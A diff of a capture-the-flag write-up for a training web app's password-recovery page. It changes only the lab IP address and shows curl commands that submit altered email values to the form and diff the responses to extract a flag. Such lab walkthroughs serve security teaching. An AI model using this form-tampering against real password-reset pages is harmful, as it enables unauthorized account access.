@@ -1,6 +1,6 @@
 # Password recover Page
 
-__http://192.168.99.101/?page=recover__
+__http://192.168.56.101/?page=recover__
 
 ## Description
 This page for password recovering. 
@@ -19,8 +19,8 @@ We get the email __webmaster@borntosec.com__.
 ## Flag
 Let's use obtained email and compare with random email.
 ```
-curl -s 'http://192.168.99.101/?page=recover' --data 'mail=webmaster%40borntosec.com&Submit=Submit' -o webmaster.html
-curl -s 'http://192.168.99.101/?page=recover' --data 'mail=krasty%40lnoisome.com&Submit=Submit' -o krasty.html
+curl -s 'http://192.168.56.101/?page=recover' --data 'mail=webmaster%40borntosec.com&Submit=Submit' -o webmaster.html
+curl -s 'http://192.168.56.101/?page=recover' --data 'mail=krasty%40lnoisome.com&Submit=Submit' -o krasty.html
 diff webmaster.html krasty.html 
 ```
 Inside the diff output html we get the flag
